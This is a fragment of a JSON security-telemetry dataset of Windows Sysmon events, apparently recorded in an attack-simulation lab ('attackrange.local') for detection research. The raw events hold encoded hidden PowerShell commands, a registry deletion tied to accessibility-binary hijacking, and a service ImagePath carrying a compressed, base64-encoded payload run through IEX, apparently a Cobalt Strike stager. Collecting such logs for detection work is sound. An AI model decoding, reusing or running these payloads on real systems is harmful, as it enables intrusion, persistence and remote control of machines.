Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{7E748F86-9717-5FBB-0000-0010F17A2C00}</Data><Data Name='ParentProcessId'>4804</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABVAG4AcgBlAHMAdAByAGkAYwB0AGUAZAAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAASgBnAEIAagBBAEcAZwBBAFkAdwBCAHcAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEASQBBAEEAMgBBAEQAVQBBAE0AQQBBAHcAQQBEAEUAQQBJAEEAQQArAEEAQwBBAEEASgBBAEIAdQBBAEgAVQBBAGIAQQBCAHMAQQBBAG8AQQBKAEEAQgBsAEEASABnAEEAWgBRAEIAagBBAEYAOABBAGQAdwBCAHkAQQBHAEUAQQBjAEEAQgB3AEEARwBVAEEAYwBnAEIAZgBBAEgATQBBAGQAQQBCAHkAQQBDAEEAQQBQAFEAQQBnAEEAQwBRAEEAYQBRAEIAdQBBAEgAQQBBAGQAUQBCADAAQQBDAEEAQQBmAEEAQQBnAEEARQA4AEEAZABRAEIAMABBAEMAMABBAFUAdwBCADAAQQBIAEkAQQBhAFEAQgB1AEEARwBjAEEAQwBnAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBVAEEAZQBBAEIAbABBAEcATQBBAFgAdwBCADMAQQBIAEkAQQBZAFEAQgB3AEEASABBAEEAWgBRAEIAeQBBAEYAOABBAGMAdwBCADAAQQBIAEkAQQBMAGcAQgBUAEEASABBAEEAYgBBAEIAcABBAEgAUQBBAEsAQQBCAEEAQQBDAGcAQQBJAGcAQgBnAEEARABBAEEAWQBBAEEAdwBBAEcAQQBBAE0AQQBCAGcAQQBEAEEAQQBJAGcAQQBwAEEAQwB3AEEASQBBAEEAeQBBAEMAdwBBAEkAQQBCAGIAQQBGAE0AQQBkAEEAQgB5AEEARwBrAEEAYgBnAEIAbgBBAEYATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBQAEEASABBAEEAZABBAEIAcABBAEcAOABBAGIAZwBCAHoAQQBGADAAQQBPAGcAQQA2AEEARgBJAEEAWgBRAEIAdABBAEcAOABBAGQAZwBCAGwAQQBFAFUAQQBiAFEAQgB3AEEASABRAEEAZQBRAEIARgBBAEcANABBAGQAQQBCAHkAQQBHAGsAQQBaAFEAQgB6AEEAQwBrAEEAQwBnAEIASgBBAEcAWQBBAEkAQQBBAG8AQQBDADAAQQBiAGcAQgB2AEEASABRAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAHUAQQBFAHcAQQBaAFEAQgB1AEEARwBjAEEAZABBAEIAbwBBAEMAQQBBAEwAUQBCAGwAQQBIAEUAQQBJAEEAQQB5AEEAQwBrAEEASQBBAEIANwBBAEMAQQBBAGQAQQBCAG8AQQBIAEkAQQBiAHcAQgAzAEEAQwBBAEEASQBnAEIAcABBAEcANABBAGQAZwBCAGgAQQBHAHcAQQBhAFEAQgBrAEEAQwBBAEEAYwBBAEIAaABBAEgAawBBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQQBpAEEAQwBBAEEAZgBRAEEASwBBAEYATQBBAFoAUQBCADAAQQBDADAAQQBWAGcAQgBoAEEASABJAEEAYQBRAEIAaABBAEcASQBBAGIAQQBCAGwAQQBDAEEAQQBMAFEAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAQQBBAGEAZwBCAHoAQQBHADgAQQBiAGcAQgBmAEEASABJAEEAWQBRAEIAMwBBAEMAQQBBAEwAUQBCAFcAQQBHAEUAQQBiAEEAQgAxAEEARwBVAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEUAQQBYAFEAQQBLAEEAQwBRAEEAWgBRAEIANABBAEcAVQBBAFkAdwBCAGYAQQBIAGMAQQBjAGcAQgBoAEEASABBAEEAYwBBAEIAbABBAEgASQBBAEkAQQBBADkAQQBDAEEAQQBXAHcAQgBUAEEARwBNAEEAYwBnAEIAcABBAEgAQQBBAGQAQQBCAEMAQQBHAHcAQQBiAHcAQgBqAEEARwBzAEEAWABRAEEANgBBAEQAbwBBAFEAdwBCAHkAQQBHAFUAQQBZAFEAQgAwAEEARwBVAEEASwBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEEAQQBYAFEAQQBwAEEAQQBvAEEASgBnAEEAawBBAEcAVQBBAGUAQQBCAGwAQQBHAE0AQQBYAHcAQgAzAEEASABJAEEAWQBRAEIAdwBBAEgAQQBBAFoAUQBCAHkAQQBBAD0APQA=</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "11",
        "Timestamp": "2020-11-23T11:03:51.343123400Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-638.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "11",
          "Version": "2",
          "Level": "4",
          "Task": "11",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2020-11-23T11:03:51.343123400Z"
          },
          "EventRecordID": "18279",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2148",
            "ThreadID": "3628"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-638.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "",
          "UtcTime": "2020-11-23 11:03:51.333",
          "ProcessGuid": "{7E748F86-9717-5FBB-0000-0010AF7B2C00}",
          "ProcessId": "6920",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "TargetFilename": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cwvgnuem.3wx.ps1",
          "CreationUtcTime": "2020-11-23 11:03:51.333"
        }
      }
    },
    "12": {
      "event_id": "12",
      "length": 6496,
      "source_file": "datasets\\attack_techniques\\T1562.004\\atomic_red_team\\windows-sysmon.log",
      "event_index_in_file": 9872,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T11:04:01.222095700Z'/><EventRecordID>18771</EventRecordID><Correlation/><Execution ProcessID='2148' ThreadID='3628'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-638.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-23 11:04:01.220</Data><Data Name='ProcessGuid'>{7E748F86-9721-5FBB-0000-0010FEA52D00}</Data><Data Name='ProcessId'>6116</Data><Data Name='Image'>C:\\Windows\\System32\\reg.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>\"C:\\Windows\\system32\\reg.exe\" delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe\" /v Debugger /f</Data><Data Name='CurrentDirectory'>C:\\Users\\Administrator\\AppData\\Local\\Temp\\</Data><Data Name='User'>ATTACKRANGE\\Administrator</Data><Data Name='LogonGuid'>{7E748F86-971E-5FBB-0000-002045462D00}</Data><Data Name='LogonId'>0x2d4645</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD,IMPHASH=EE7EB7FA7D163340753B7223ADA14352</Data><Data Name='ParentProcessGuid'>{7E748F86-9720-5FBB-0000-001042952D00}</Data><Data Name='ParentProcessId'>660</Data><Data Name='ParentImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='ParentCommandLine'>\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" &amp; {$input_table = \\\"\"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\\\"\".split(\\\"\",\\\"\")\n<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T11:04:01.222310700Z'/><EventRecordID>18772</EventRecordID><Correlation/><Execution ProcessID='2148' ThreadID='3628'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-638.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-23 11:04:01.208</Data><Data Name='SourceProcessGUID'>{7E748F86-9720-5FBB-0000-001042952D00}</Data><Data Name='SourceProcessId'>660</Data><Data Name='SourceThreadId'>4828</Data><Data Name='SourceImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetProcessGUID'>{7E748F86-9721-5FBB-0000-0010FEA52D00}</Data><Data Name='TargetProcessId'>6116</Data><Data Name='TargetImage'>C:\\Windows\\system32\\reg.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\\Windows\\SYSTEM32\\ntdll.dll+a6d64|C:\\Windows\\System32\\KERNELBASE.dll+2b860|C:\\Windows\\System32\\KERNELBASE.dll+6b246|C:\\Windows\\System32\\KERNEL32.DLL+1c213|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+3332f6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+2b5560|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+2b4f07|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f616bc1d(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560c827(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560c4f8(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f60bdddd(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f55cd08e(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f562b55d(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560ebc2(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560ebc2(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560ebc2(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560ebc2(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560ebc2(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560ea53(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f56009d8(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560cf0b(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560caa7(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560c827(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+f560c4f8(wow64)</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "12",
        "Timestamp": "2020-11-23T11:04:01.224898400Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-638.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "12",
          "Version": "2",
          "Level": "4",
          "Task": "12",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2020-11-23T11:04:01.224898400Z"
          },
          "EventRecordID": "18779",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2148",
            "ThreadID": "3628"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-638.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "T1183,IFEO",
          "EventType": "DeleteValue",
          "UtcTime": "2020-11-23 11:04:01.224",
          "ProcessGuid": "{7E748F86-9721-5FBB-0000-0010FEA52D00}",
          "ProcessId": "6116",
          "Image": "C:\\Windows\\system32\\reg.exe",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe\\Debugger"
        }
      }
    },
    "13": {
      "event_id": "13",
      "length": 6971,
      "source_file": "datasets\\attack_techniques\\T1055\\cobalt_strike\\windows-sysmon.log",
      "event_index_in_file": 17173,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-02-23T21:56:50.655910400Z'/><EventRecordID>120512</EventRecordID><Correlation/><Execution ProcessID='3064' ThreadID='2356'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-177.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1031,T1050</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2021-02-23 21:56:50.654</Data><Data Name='ProcessGuid'>{64AF4F22-4083-6035-0A00-00000000AD01}</Data><Data Name='ProcessId'>620</Data><Data Name='Image'>C:\\Windows\\system32\\services.exe</Data><Data Name='TargetObject'>HKLM\\System\\CurrentControlSet\\Services\\78ae284\\ImagePath</Data><Data Name='Details'>%%COMSPEC%% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADMAUABhAE8AQgBQACsASABQADQASwBmAGMAaQBNADcAUwBsAFEARQB0AEkAMAA5AEMAWQB6ADUAWQBjAEIAOAB3AEsAQgBtAEMAUwAwAEgATQBNAEkAVwBRAFkAVABZADQARQBrAEcANQB4AHIALwAvAGQAMwBaAFcATwBPAFgAcABPADcAegB0AHgAbABoAG8AawBzADcAYQA1ADIAbgAzADEAMgBWAHoAYQBWAEIAVgB0AHkAagA4AGcAZQBjAHkAZwBxAFAARgBJAHUAUABCAGEAZwB5ADEAegB1AHYATQBFAHMAaQBXADcAUgBaAHkAMwBuAGgAZwBHAFIAYQBsAHMAdABaAGcAcwBxAFoAeAB2AE8AeQBBAHcANwBEAHEAZABDAG8ARAA5AHkAWgB3AFAATQA4AFIAcgBwADUAeABIAG0AcwB6AFYAegBRAHAALwBtAFUAZgBLAGgAQgBLAGsAVABjAG0AcQBjAG4AZQBYAE8AawBxADAAdwBFAE4AaQBsAHMAdwBCAEwATAA2AEsAegBOAFoAVgBMADUAZwBpADQAUwBKADkAVQBOADUAcwBHAFcAMgBNAHYAbQBIADcANgBWAEEAOAA1AHAANABGAE0AdgA0AHMAdABLAHEAdABDADAAUABYAGMAOQA2AGoAUQBEAGYAUQBOAFAAUwAwAHAAcAA0AFcANwArAFkAbwBTAGkAZgA1AEEANQA3AE4AaQB5ADIAZAB6ADcAQgAvAEUANABqAG8AbQBTAHcAaQBvAEcAagBqAHEAcgBNAHMASQBWAGgARQBVADcAWQAzAHYAUwBWADMANwAvAFgAZgBOAG0AQgBRAHUAcABrAFYAegBHADIASgBmADYASgBvAGQAQwAwAG4AWABSAGMAZgAzAE4AUQBOADkATgA5AFMARgBvADMAaABEAGQAYQAzAG4ARQBjADQARQBjADIAWAB4AHkAUQB2AEsAbAA4AFcASAB4AFAAdAArADQAbgB3AHYAOQBWADAAegBEAHAARQB0AE4AaABqAGkAZQBEAHQASQBaAFQAWABWADAAVABWAFkARABnAEMAYgBhAG8AcQBoAGwAawBjAFQAZABkADkAawBPAGsAVwBmAGoAOQA3AGMAaAA0AEgAMAAxAHIAUgBvAEIAWgBKAHkAdAByAEUAcABqAHoAeABDAFIAYgBHAE4AQQA4AGUAbgA5ADkAUQBGAE4AVQAxAEEAKwBvAEsARgBaAG8AQQBUAG4ATQBxAFEAQgB5AGoAegBCAGYAUQBpADkAawB6ADEAOAB5AEQAMAAvAFQAegBZAG4AZgB5AHEAMwBhAG4AZQBwADcAcwBNADMARgA5AFYAMABrACsAVgBRAEcAbwBnAHUAWgBFAC8AYwBPAEoAWAA0AE8AZwBsAHYARQBuAE4AUQBUAGcALwBlAFgAOQBDAEwAZwBQACsAZgBpAEsAWQBrAGYAdQBlAGUANABXAHEARAB2AFgAcABBAGsAcwA2AGsANABEAHYAQwBWAGQAegBaADIAZQBUAFoARQBrAGgASABuADMAQQBoAEoAZgBvADMAYQBKAFMASAB2AFgAQQBDAFMAdwBaAGoAMQBVADYAUgB6AHkAawB4AHYAVABQAC8ASwBUAFgAWgBwAG8AaQAvADYAYQBoAGkAMAB6AHIAbwBKAE8AbQBKAC8AWABqAEYAawAwAGUAbQBlAGQATQBjADIAZABHADcAcwBBAGUAdABUACsAYgBoADUANwB2AFUASwA3AE8AMwA2ADYARwBCAG4AVwA5AGcARABiAGkAQQBLADgAOQBrAGgARgBlAGYAeQAxAG4AMQBQAFYAcABnAGsAYwB4AEUAKwB1AEQAbgA3AHAAMgBPAEsAQgBPADQANABDAE8AcABnAEMAZAAvAEsAeABtAHIAagAxADUAMQBLADIAbAB6AGwAVQBKADUARgAyAEEAVgAwAEEASgA0ADAAZABuADAAaAB6AHEAbQBoAFgAMAA2AEIAcgB3AFMANwArAEIAcAB1AGMAdQBsAEIAbgBOAHAAQQArAGwARgBXAGUAMwBxADIALwBGADUAYgBxAFAAaABjAGkAagBRAFEAaAAxAFQAdgBMAEkAcAB0AGkAbgBUAGgANQBWAEEAKwBFAGQAagBxAHEAaABaAE0AbABTACsAOQBQAGQAWAB1AGgATABqADIAQQBoAE0AMwBOAFQANAB4AFYASQBEADEAZgBYAFcAUQBBAFYARQB4AEwASQBMAHMAQQB3AHMAagBlAFUAZQBOAGgAWABxAE8AUgBSADIAMwBOAG8ATABiAGEAOQBSAGUAYQBDADkAaQBvAG0AZABlAHoANwBVAEgASgBnAEsAWQBLAGMAdwBJADcAQwB3AHAAYQBLAE0AOQB6AEoALwA1AFUAZgBSAHQARwBtADAAbABwAHYAZgBMAG8ARwA2AGEAUQBMAE4AWAAyADgAZwBKADUAegBxAEsAaQBFAGIAbgBoAEIASABlADEAdgAzAE0ANwBxAEoAQwAwAEsAaABWAFUARwAwAG8AbgBUAFEAQQBEAGIAWgB6AEsAUABIAGoAMAB1AG8AYQA5AHAAKwBaACsASQA5ACsALwBjACsANwBIAEYALwBPAEIAbQBuAGQATgBEAEkAdgBXAGsARQBDAGUAMQBXAEsAcAB5AFMAUwBTAEoARwBpADYAMwBSAHkAdwBUADUATABnAEUAMQBKAHEAYwByAFcAdABZADAATwBzAHIATwAyAGwAagB1AGwAYQArAEMAYgBkAFcAMwBGAHMATgByADMAbgBMAGoASgByAHQAYgBkAHMAYwB3AFMAKwBDAFgAMwBuAGIATgBMAHYAZAB6AHYAMgBtAGQAdAA4AGwAWgBuAGcAMwBhAEoAYwA2AHIAagBXADgAYQBWAHkARgB1ADkAQQBLAFIANwBWAFMAdQBWAGsAQwB1AFoAZAB0AHkAMwBTAHQANgBJADUAOQB1AFEAagBYAFYAeABmAE8AeABvAHIANgBzAEMAYwArAGIAdAB1AGkAWQBVAFcATgBhAHYAdAB5AHkANQByAFgAQwA2ADkAeQBzAEoAUABxAEQAKwBlADcAaQAvAG4AWQBhAG4ANgBjAHQANQBwAFgANwBVAGYAUgBWAFAASgB0AEsANgBvADEAdAAvAFUASwBnAC8AVgA3AEsANgBxAHoARAB1AGoAZABYAEcAKwBDADIAcwA2ADUAbwBtAGIAbgBtAG8ANgA3AFoARgBlAFcATgB4AFEAdgA5AHYASAAvAEgAdAArAFoAWQBiAC8AegBwAFMAUgBXAFAAWQBqAEIAcgByAHkAUQBUAHIAMwBmAHMAVQByAHkANAA3AEwAYwBhAEoAVQBIAFgAMQA5AGkASgBsAFoAVwAzAFAAOQBnAGgAcAB1AFkAUABJAHYAVgBjADAAeABXAGQAbgB3ADMANgBzAFEAZwA5AC8AegBzADIAMwBaAHQAYgAxADkAKwBIAGIAMABmAHUASwBRAFMAMwBMAEgAKwB6AHUAbABZADUAVwBhADMAWAB0AHIAVABuAGYATgB5AHUAUQBuADcANAA5AEgARAA4ADgAcQAyAFEAZgA2AGEATgA5AG4AZABRADcAQQBWAHIAYwBXAFYASABiAEwAeABqAGsAUwB3AGYAMgBIAGIAegB0ADYAQgB3AEsASgB4AC8ASwBVADgAdwBNAHoAWgBrAFoAZABrAFAAKwA0ADEANABPADcAVABNADgAQwBIAGwATABlAHQAbQB6AGIARQBGAGQAVABpAEwAdAA5ADYAQgBEAEEAbgA3AFYANwBjAFgAYwBZAEQATwA3AEgAcABtAE4ASABxADAAdgAzAG8AZwB2ADgAbAArADkAMwBUAHgAYQBiAGQASgBwAFUAdAB5AEYAOAB2AG8AMQBvAHMAOABKAFYAUABuAHUAMwBLADMAZABOAGkAUABDAFkAVgB1AFcALwBYAFgAZwBaAGQAMABuADgAaAA1AFgAYgBsAGYAVwBOAGMARwBkAGwAKwB2ACsAVwBXAFAAdgBUAHMAaAAxADIALwB1AFgAeQBZAHQAMwBhAGwAdQBiAG4ALwBjAHQAKwA0AHIAegA0ADEAYQAyAEoAawAzAGcAKwBIAFoAcwAzAEUAWgBtADAANABhAHUANgBIAHcAMgBHAE4AcgBZAGkAMwBKAGEAUABGADcAYQAxAGkAbgBjAHMANAB6AEoARwA5ADYAcwAyAC8ASQBmAGgAZgA4AEMAVQA2ADgAZwByAFkAQgBFAFIAVgArACsALwBlAEcAYQBxAC8ASAAwADgAbQA1AC8AdABwAE4AbwArAFAAMwA0AFgANQBIAHEAeQBWAFAAeQBpAE8ASgBpAGMAUgBQAG0ASABtAFcAMABPAHUAaAA3AGwAWQBZAGgAOABZAEMANABNAHEAYQB6AE4ATgB4AHAAdQBIAGMAVABOAGcAbgB0AEwAUQA5AGQAZABmAFMATQArAFUAQgA5AFMASAAxAHcATwA4AEwANwBMAGkAcgBQAG8AKwBJADIAcABBAHYAagBHAHAAWQBGAHkAbgBRADMAUQBLAFQAZQBnAEIAbAB1AFgATABWADEAYwBHAE8AZwByAEMAVgBFAHgAagBtAG8AZQB1AG0AdwB5AFIAUQA0AFQAWgBMAE0AMABFAFAAMwAzADYAQwB1AEgAbABUADAARABzADAAbQBBAGgAbAAzAGwAVQAyAHAAZABMAHAAWgBMADYAZgAxAFUAeQBjAHIAOABPAFMANQAxAHQAWQB2ADEAbwBMAHEAKwBHADYASQBrAG4AcAB6AGYANQB5AFUAMwBHAEEAWAAwAGUAQgBtAHYANgBIAHkAYgBnAGgAMAB2AC8ARwBWAG8ARgBYAGoASwBIAGoAOQBBAGwARAByADIATwBsADUASABUAFAAdQBkAHkAbABvAHQATwA5AG8AWAAzAEEAcQA5AE0AdQBrAFUAMwBDAGYAZQBFAHgARgB3AFcAVgBtAHcATwBUADkASwBrAHgAKwByAG4AMgBFAEMAVwBPAFUAYgBuAEcASAAxAEgAQgBRAGkAdgBLAHMAcQBYADgAQwA3AGwAaQAxAEEAMQBYAEoAUQArAHMANwArAGgASABmAFoAUwB4AFcALwBvAG4AaABJAEsAegA2AFIAQwBoADgAMgBCAHAAUgBUAG0AcABqAEsAZABHAEYASABDAHMAUABkAC8AMgAvAHkAMABvADcAYwBMAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=</Data></EventData></Event>",
